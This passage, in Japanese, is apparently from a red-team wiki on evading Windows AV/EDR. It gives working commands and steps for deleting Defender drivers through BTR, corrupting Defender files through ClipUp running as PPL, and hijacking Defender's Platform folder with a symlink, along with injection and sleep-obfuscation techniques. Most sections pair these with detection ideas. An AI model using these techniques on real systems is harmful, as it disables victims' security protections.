# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` は使用できません。BTR はストレージスタックと `SystemRoot` リンクの準備が整う前に、`DriverEntry` からファイル I/O を行うためです。高優先度の `Boot Bus Extender` グループと `Start=1` を組み合わせると、Phase 1 で実行されます。この時点では NTFS は使用可能ですが、多くのシステム起動時セキュリティドライバーやユーザーモードの EDR サービスはまだ初期化されていません。`WdFilter` などのブート開始フィルターはすでに読み込まれている場合がありますが、BTR は次回の起動前にそのバイナリやサービス構成を削除でき、SCM が起動する前にサービス実行ファイルを削除することもできます。BTR はブート開始時の評価後に実行され、有効な Microsoft 署名を持つため、ELAM でもこの隙間は埋められません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoC は、ハードコードされた `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこのログを作成し、自身の削除要求を処理してアンロードする前にログを削除します。これにより証拠を減らせます。また、フィードバックを `<random>.sys:<random>.dat` に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 高い検知シグナルとなる相関関係

署名のみを対象とするルールや Microsoft の脆弱なドライバーのブロックリストでは、BTR の本来の機能を悪用する行為に対処できません。正規の Defender 系統と任意のランチャーを区別しながら、次のような振る舞いの相関関係を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR のステージングで必ず発生します。同じ `.sys` に付加された `.dat` ADS は特に疑わしいものです。正規の Defender は通常、フィードバックを `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 以下に保存するためです。
- **System 7045 を伴わない Sysmon 12/13:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM インストールイベントがないことと相関させます。
- **Sysmon 6 -> 23:** 既知の BTR ドライバーが Defender 系統以外から読み込まれ、その後に `System`/PID 4 によるファイル削除が発生することを相関させます。特にセキュリティ関連のバイナリが対象の場合は注意してください。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の短時間での作成と削除をアラートします。
- `SeLoadDriverPrivilege` の割り当てと有効化を制限し、監査してください。`cmd.exe`、PowerShell、または不明なプロセスがセキュリティツールのドライバーをステージングしている場合、Microsoft 署名だけでは信頼できるとは限りません。

## LOLBINs を使った Protected Process Light (PPL) の悪用による AV/EDR の改ざん

Protected Process Light (PPL) は signer/level の階層を適用し、同等以上に保護されたプロセスだけが相互に改ざんできるようにします。攻撃者の視点では、PPL 対応バイナリを正規の方法で起動し、その引数を制御できる場合、ログ記録などの無害な機能を利用して、AV/EDR が使用する保護ディレクトリに対する、制約付きの PPL で保護された書き込みプリミティブを実現できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスを PPL として実行するための条件
- 対象の EXE（および読み込まれる DLL）は、PPL 対応の EKU で署名されている必要があります。
- プロセスは、次のフラグを指定して CreateProcess で作成する必要があります: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に合致する互換性のある保護レベルを要求する必要があります（例: anti-malware 署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。レベルが一致しないと、作成に失敗します。

PP/PPL と LSASS 保護に関するより広範な入門については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象の EXE に渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用例:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN プリミティブ: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自ら子プロセスを起動し、呼び出し側が指定したパスにログファイルを書き込むパラメーターを受け取ります。
- PPL プロセスとして起動すると、PPL による保護のもとでファイル書き込みが行われます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3 短縮パスを使用します。

8.3 短縮パスのヘルパー
- 短縮名を一覧表示: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` を指定して PPL に対応した LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を渡し、保護された AV ディレクトリ（例: Defender Platform）内にファイルを作成させます。必要に応じて 8.3 短縮名を使用します。
3) 対象バイナリが AV の実行中に通常ロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールして、起動時に書き込みをスケジュールします。Process Monitor のブートログで起動順序を検証します。
4) 再起動すると、AV がバイナリをロックする前に PPL による保護のもとで書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスを伏せる／短縮しています）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- ClipUp が書き込む内容は配置先以外制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動と再起動のタイミングが必要なため、ローカル管理者権限または SYSTEM 権限が必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行することでファイルロックを回避できます。

検知
- 起動前後に、特に標準外のランチャーを親プロセスとして、通常とは異なる引数で `ClipUp.exe` が起動されていないか確認します。
- 不審なバイナリを自動起動するよう設定された新しいサービスや、Defender/AV より常に先に起動するサービスを確認します。Defender の起動失敗より前にサービスの作成／変更が行われていないか調査します。
- Defender のバイナリ／Platform ディレクトリを対象としたファイル整合性監視を実施します。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更を確認します。
- ETW/EDR テレメトリでは、`CREATE_PROTECTED_PROCESS` を指定して作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を調べます。

緩和策
- WDAC/Code Integrity: PPL として実行できる署名済みバイナリと、その親プロセスを制限します。正当な状況以外での ClipUp の起動をブロックします。
- サービス管理: 自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効になっていることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを格納するボリュームで 8.3 短縮名の生成を無効にすることを検討します（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の配下のサブフォルダーを列挙して、実行する Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も大きい辞書順のバージョン文字列（例: `4.18.25070.5-0`）を持つサブフォルダーを選択し、そこから Defender サービスのプロセスを起動します（それに応じてサービス／レジストリのパスも更新します）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）を含むディレクトリエントリが信頼されます。管理者はこれを利用して、Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を引き起こすことができます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者（Platform フォルダー配下にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender による Platform の再選択をトリガーできること（起動時のサービス再起動）
- 組み込みツールのみで実行可能（mklink）

動作する理由
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択時にはディレクトリエントリを信頼し、リンク先が保護された／信頼されたパスに解決されるか検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) たとえば `C:\TMP\AV` に、現在の Platform フォルダーの書き込み可能な複製を用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョン番号のディレクトリシンボリックリンクを作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します。
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
次のプロセスパスが `C:\TMP\AV\` 配下にあり、サービス構成やレジストリにもその場所が反映されていることを確認してください。

ポストエクスプロイトの選択肢
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置・置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- サービスの停止／DoS: バージョンシンボリックリンクを削除すると、次回起動時に設定されたパスが解決できず、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この手法だけでは権限昇格できない点に注意してください。管理者権限が必要です。

## PIC を使った API/IAT Hooking + Call-Stack Spoofing（Crystal Kit-style）

Red team は、Import Address Table（IAT）をフックし、選択した API を攻撃者が制御する position-independent code（PIC）経由で呼び出すことで、ランタイム回避を C2 implant から対象モジュール自体へ移せます。これにより、多くの kit が公開する限られた API（例：CreateProcessA）を超えて回避手法を一般化し、同じ保護を BOF や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

大まかな手順
- reflective loader を使い、対象モジュールと一緒に PIC blob を配置します（先頭に追加するか、別ファイルとして配置）。PIC は自己完結型で、position-independent である必要があります。
- ホスト DLL のロード時に、その IMAGE_IMPORT_DESCRIPTOR をたどり、対象の import（例：CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT エントリを、薄い PIC wrapper を指すように書き換えます。
- 各 PIC wrapper は、実際の API アドレスへ tail-call する前に回避処理を実行します。一般的な回避処理には以下があります。
  - 呼び出しの前後でメモリを mask/unmask する（例：beacon 領域を暗号化する、RWX→RX に変更する、ページ名や権限を変更する）ことで、呼び出し後に元に戻します。
  - Call-stack spoofing：無害に見えるスタックを構築し、対象 API へ処理を移すことで、call-stack 解析時に想定どおりのフレームが解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOF、post-ex DLL に対してフックする API を登録できるインターフェースを export します。

ここで IAT hooking を使う理由
- フック対象の import を使うあらゆるコードで機能し、ツールのコードを変更したり、特定の API を Beacon 経由で proxy したりする必要がありません。
- post-ex DLL にも対応します。LoadLibrary* をフックすると、モジュールのロード（例：System.Management.Automation.dll、clr.dll）を intercept し、それらの API 呼び出しにも同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper することで、call-stack ベースの検出に対して、プロセスを生成する post-ex コマンドを安定して使用できます。

最小限の IAT hook の概略（x64 C/C++ 疑似コード）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR後、importが初めて使用される前にpatchを適用します。TitanLdr/AceLdrなどのReflective loaderは、ロードされたmoduleのDllMain内でhookする方法を示しています。
- wrapperは小さく、PIC-safeに保ちます。patch前に取得した元のIAT値、またはLdrGetProcedureAddressを使って本来のAPIを解決します。
- PICではRW → RXの遷移を使い、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr形式のPIC stubは、良性module内のreturn addressを使って偽のcall chainを構築し、その後、本来のAPIへpivotします。
- これにより、Beacon/BOFから機密性の高いAPIへ至るcanonical stackを想定する検知を回避できます。
- stack cutting/stack stitching技術と組み合わせ、API prologueの前に期待されるframe内へ移動します。

運用への統合
- post-ex DLLの先頭にReflective loaderを追加し、DLLのロード時にPICとhookが自動的に初期化されるようにします。
- Aggressor scriptで対象APIを登録すると、BeaconとBOFがコード変更なしで同じ回避経路を透過的に利用できます。

検知/DFIRでの考慮事項
- IAT integrity: non-image（heap/anon）アドレスを指すentry、およびimport pointerの定期的な検証。
- Stack anomalies: loaded imageに属さないreturn address、non-image PICへの突然の遷移、一貫性のないRtlUserThreadStartの祖先関係。
- Loader telemetry: プロセス内でのIATへの書き込み、import thunkを変更する早期のDllMain処理、ロード時に作成される予期しないRX領域。
- Image-load evasion: LoadLibrary*をhookしている場合、memory masking eventと相関する不審なautomation/clr assemblyのロードを監視します。

関連する構成要素と例
- ロード中にIAT patchingを行うReflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）とstack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐PICOによるimport-time IAT hook

Reflective loaderを制御できる場合、`ProcessImports()`の**実行中**に、loaderの`GetProcAddress` pointerをhookを先に確認するcustom resolverへ置き換えることでimportをhookできます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的なloader PICが自身を解放した後も存続する**resident PICO**（persistent PIC object）を作成します。
- loaderのimport resolverを上書きする`setup_hooks()`関数をexportします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress`ではordinal importをスキップし、`__resolve_hook(ror13hash(name))`のようなhashベースのhook検索を使います。hookがあればそれを返し、なければ本来の`GetProcAddress`へ委譲します。
- Crystal Palaceの`addhook "MODULE$Func" "hook"` entryを使って、link時にhook対象を登録します。hookはresident PICO内にあるため有効なままです。

これにより、ロード後にDLLのcode sectionをpatchすることなく、**import-time IAT redirection**が可能になります。

### 対象がPEB-walkingを使う場合にhook可能なimportを強制する

import-time hookが発動するのは、対象のIATに関数が実際に含まれている場合だけです。moduleがPEB-walk + hashでAPIを解決している（import entryがない）場合は、実際のimportを強制し、loaderの`ProcessImports()`経路で処理されるようにします。

- hash化されたexport解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject`のような直接参照に置き換えます。
- compilerがIAT entryを出力するため、Reflective loaderによるimport解決時にinterceptionが可能になります。

### `Sleep()`をpatchしないEkko形式のsleep/idle obfuscation

`Sleep`をpatchする代わりに、implantが実際に使用する**wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）をhookします。長時間のwaitでは、Ekko形式のobfuscation chainで、idle中にメモリ上のimageを暗号化します:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer`を使い、加工した`CONTEXT` frameで`NtContinue`を呼び出すcallback sequenceをスケジュールします。
- 典型的なchain（x64）: imageを`PAGE_READWRITE`に設定 → `advapi32!SystemFunction032`でmemory上にmapされたimage全体をRC4暗号化 → blocking waitを実行 → RC4復号 → PE sectionを走査して**sectionごとのpermissionを復元** → 完了を通知。
- `RtlCaptureContext`でtemplateとなる`CONTEXT`を取得し、複数のframeに複製して、各stepを呼び出すregister（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: imageがmaskされている間にcallerが処理を続けられるよう、長時間のwaitでは`WAIT_OBJECT_0`などの「success」を返します。このパターンはidle中のscannerからmoduleを隠し、典型的な「patched `Sleep()`」のsignatureを回避します。

検知のアイデア（telemetryベース）
- `NtContinue`を指す`CreateTimerQueueTimer` callbackの集中発生。
- 大きな連続領域、特にimageサイズのbufferに対する`advapi32!SystemFunction032`の使用。
- 大範囲の`VirtualProtect`の後に行われる、customなsectionごとのpermission復元。

### Sleep-obfuscation gadgetのruntime CFG登録

CFGが有効なtargetでは、`jmp [rbx]`や`jmp rdi`などのmid-function gadgetへの最初のindirect jumpは、通常、gadgetがmoduleのCFG metadataに含まれていないため、`STATUS_STACK_BUFFER_OVERRUN`でprocessをクラッシュさせます。hardeningされたprocess内でEkko/Kraken形式のchainを動作させるには:<sup>[[30]](#references)</sup>

- chainで使用するすべてのindirect destinationを、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)`と`CFG_CALL_TARGET_VALID` entryで登録します。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内のaddressでは、`MEMORY_RANGE_ENTRY`の開始位置を**image base**とし、**image全体のサイズ**を範囲に含める必要があります。
- 手動mapされた/PIC/stompされた領域では、代わりに**allocation base**とallocation sizeを使用します。
- dispatch gadgetだけでなく、indirectに呼び出されるexport（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect targetとなる攻撃者制御の実行可能sectionも登録します。

これにより、ROP/JOP形式のsleep chainは「CFGが無効なprocessでしか動作しない」ものから、`explorer.exe`、browser、`svchost.exe`など、`/guard:cf`付きでcompileされた他のendpointでも再利用可能なprimitiveになります。

### sleep中のthreadに対するCET-safeなstack spoofing

`CONTEXT`全体の置き換えは目立ちやすく、また、spoofした`Rip`がhardware shadow stackと一致する必要があるため、CET Shadow Stack環境では問題が起きる可能性があります。より安全なsleep-maskingパターンは次のとおりです:<sup>[[30]](#references)</sup>

- 同じprocess内の別threadを選び、`NtQueryInformationThread`経由でその`NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）を読み取ります。
- 現在のthreadの実際のTEB/TIBをbackupします。
- `GetThreadContext`で実際のsleep中のcontextを取得します。
- spoof contextには実際の`Rip`**だけ**をコピーし、spoofした`Rsp`/stack stateはそのままにします。
- sleep中は、stack walkerが正当なstack範囲内でunwindするよう、spoof threadの`NT_TIB`を現在のTEBにコピーします。
- waitの完了後、元のTIBとthread contextを復元します。

これによりCETと整合するinstruction pointerを保ちながら、unwindの検証時にTEB stack metadataを信頼するEDR stack walkerを誤誘導できます。

### 代替手段: APCベースのKraken Mask

timer-queue dispatchのsignatureが強すぎる場合は、suspended helper threadからqueued APCを使って、同じsleep-encrypt-spoof-restore sequenceを実行できます:<sup>[[27]](#references)</sup>

- entrypointを`NtTestAlert`にしてhelper threadを作成します。
- `NtQueueApcThread`で準備した`CONTEXT` frame/APCをキューに入れ、`NtAlertResumeThread`で処理します。
- defaultの64 KB thread stackを使い切らないよう、chain stateはhelper stackではなくheapに保存します。
- `NtSignalAndWaitForSingleObject`でstart eventの通知とblockをアトミックに行います。
- 半端な状態に復元されたstackをscannerに捉えられるrace windowを短くするため、TIB/contextを復元する前にmain threadをsuspendします（`NtSuspendThread` → restore → `NtResumeThread`）。

これにより、RC4 maskingとstack-spoofingの目的を保ったまま、`CreateTimerQueueTimer` + `NtContinue`のsignatureをhelper-thread/APCのsignatureに置き換えます。

追加の検知アイデア
- sleep、wait、APC dispatchの直前に実行される、`VmCfgCallTargetInformation`を指定した`NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe`の前後で呼び出される`GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread`の後に行われる、現在のthreadのTEB/TIB stack boundsへの直接書き込み。
- `SystemFunction032`、`VirtualProtect`、section-permission復元helperへ間接的に到達する`NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名付きmodule内のdispatch pivotとして繰り返し使われる、`FF 23`（`jmp [rbx]`）や`FF E7`（`jmp rdi`）のような短いgadget signature。


## Precision Module Stomping

Module stompingは、明らかに目立つprivate executable memoryを割り当てたり、新しい犠牲DLLをロードしたりする代わりに、**対象process内にすでにmapされているDLLの`.text` sectionからpayloadを実行**します。上書き先には、processがまだ必要とするcode pathを破損させずに、payloadを格納できる**ロード済みのdisk-backed image**を選ぶ必要があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高いtarget選択

`uxtheme.dll`や`comctl32.dll`などの一般的なmoduleを相手にした単純なstompingは不安定です。DLLがremote processにロードされていない場合があり、また、code regionが小さすぎるとprocessがクラッシュします。より信頼性の高い手順は次のとおりです。

1. 対象processのmoduleを列挙し、すでにロードされているDLLのみの**名前リスト**を作成します。
2. 先にpayloadをビルドし、**正確なbyteサイズ**を記録します。
3. 候補となるDLLをディスク上で走査し、PE sectionの**`.text` `Misc_VirtualSize`**とpayloadサイズを比較します。これは、**メモリにmapされたとき**の実行可能sectionのサイズを反映するため、file sizeより重要です。
4. **Export Address Table (EAT)**を解析し、stomp開始offsetに使用するexport済み関数のRVAを選びます。
5. **blast radius**を計算します。payloadが選択した関数の境界を超える場合、メモリ上で後ろに配置された隣接exportを上書きします。

実環境で使われている一般的なrecon/選択用helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` のテレメトリや予期しないイメージ読み込みを避けるため、リモートプロセスですでに **ロード済み** の DLL を優先する。
- 対象アプリケーションで実行される頻度が低いエクスポートを優先する。そうでない場合、スレッド作成の前後に通常のコードパスが改変されたバイト列に到達する可能性がある。
- 大きなインプラントでは、インジェクターのソース内でバッファ全体を正しく表現するため、シェルコードの埋め込み方を文字列リテラルから **バイト配列／波括弧付き初期化子** に変更する必要がある場合が多い。

検出のアイデア
- よくあるプライベートな RWX/RX 割り当てではなく、**イメージに裏付けられた実行可能ページ**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上のエクスポートエントリポイントのバイト列が、ディスク上の元ファイルと一致しない。
- 最近先頭のバイト列が変更された正規 DLL のエクスポート内から実行を開始するリモートスレッドやコンテキストのピボット。
- DLL の `.text` ページに対する `VirtualProtect(Ex)` / `WriteProcessMemory` の後にスレッドを作成する不審なシーケンス。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込みパス（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **プロセスインジェクション／EDR 回避** 手法である。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が **選択した `CreateProcessW` の起動パラメーターを子プロセスにコピー** し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存する仕組みを悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` がコピーする汚染可能なキャリア

有用なキャリアは次のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` を指定）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の制約：

- `lpCommandLine` は `CreateProcessW` に対して **書き込み可能なメモリ** を指している必要があり、終端の null 文字を含めて **32,767 個の Unicode 文字** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列の後に追加の `\0` が続く Unicode 環境ブロックでなければならない。
- `lpReserved` は公式には予約済みであるため、`ShellInfo` へのマッピングは安定した文書化済みの仕様ではなく、実装上の詳細として扱うべきである。

これにより、通常のプロセス作成が **ペイロード転送プリミティブ** となる。オペレーターは攻撃者が制御する起動データを使って子プロセスを作成し、Windows にプロセス間コピーを実行させる。

### リモート書き込み API を使わないリモート検索フロー

子プロセスの作成後、**読み取り専用** のプリミティブでコピーされたバッファーを特定する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. 通常どおりプロセスを作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` からすでに返されているメインスレッドハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

従来の thread hijacking の手順とは異なり、`SuspendThread` / `ResumeThread` は**不要**です。返されたメインスレッドハンドルに対して直接コンテキストを変更できます。

これにより、インジェクションで一般的に監視されるいくつかの API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も

### Null byte の制限と staged shellcode

3 つの carrier はすべて**文字列または文字列に似たデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築し、その後任意の second stage を読み込む **null-free first stage** です。

単純なパターンとして、XOR ベースの定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第1段階は、転送されるパラメーターに null バイトを埋め込まずに、スタック上に文字列、API 引数、DLL パス、または第2段階の shellcode loader を構築できます。

### 第1段階からのスタックベースの API 呼び出し

第1段階で `LoadLibraryA` などの API を呼び出す必要がある場合、次の操作ができます。

- 文字列/バッファーをターゲットのスタックに push する
- **32 バイトの x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16 バイト境界に整列** させる

その後、第2段階をスタックから `PAGE_READWRITE` のメモリー領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、RWX メモリーの直接確保を回避できます。

### 検知の手がかり

著者が挙げている、効果的なハンティングの手がかり：

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって **プロセスパラメーターのページが実行可能になる**
- その保護属性の変更後に `SetThreadContext` / `NtSetContextThread` が実行される
- `PEB` をリモート読み取りした後に `RTL_USER_PROCESS_PARAMETERS` を読み取る
- プロセス作成時の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が、異常に長い、またはエントロピーが高い

### 補足

- P3 は **プロセス間転送の手法** であり、それ単体では完全な実行プリミティブではありません。コピーされたパラメーターには、実行権限への変更と実行先のリダイレクト手法が別途必要です。
- `RtlCreateProcessReflection` / Dirty Vanity も著者らは検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブが呼び出されるため、採用を見送りました。

## ファイルレス回避と認証情報窃取を実現するSantaStealerの手法

SantaStealer（別名 BluelineStealer）は、現代の情報窃取マルウェアが、AV bypass、解析対策、認証情報へのアクセスを単一のワークフローに組み込む様子を示しています。<sup>[[24]](#references)</sup>

### キーボードレイアウトによる実行判定とサンドボックス遅延

- 設定フラグ（`anti_cis`）は、`GetKeyboardLayoutList` を使ってインストール済みのキーボードレイアウトを列挙します。キリル文字のレイアウトが見つかると、サンプルは空の `CIS` マーカーを作成して終了し、対象外の地域で実行されるのを防ぎながら、ハンティングに役立つ痕跡を残します。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層構造の `check_antivm` ロジック

- Variant A はプロセス一覧を走査し、各名前を独自のローリングチェックサムでハッシュ化して、デバッガーやサンドボックス用の埋め込みブロックリストと照合します。また、コンピューター名にも同じチェックサムを適用し、`C:\analysis` などの作業ディレクトリを確認します。
- Variant B はシステムのプロパティ（プロセス数の下限、最近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、スリープ前後の時間を計測して single-stepping を検知します。いずれかの検知があれば、モジュールの起動前に処理を中断します。

### Fileless helper と二重 ChaCha20 reflective loading

- メインの DLL/EXE には Chromium の credential helper が埋め込まれており、ディスクにドロップするか、メモリ上に手動でマップします。fileless モードでは helper 自身が import と relocation を解決するため、helper の痕跡はファイルとして書き込まれません。
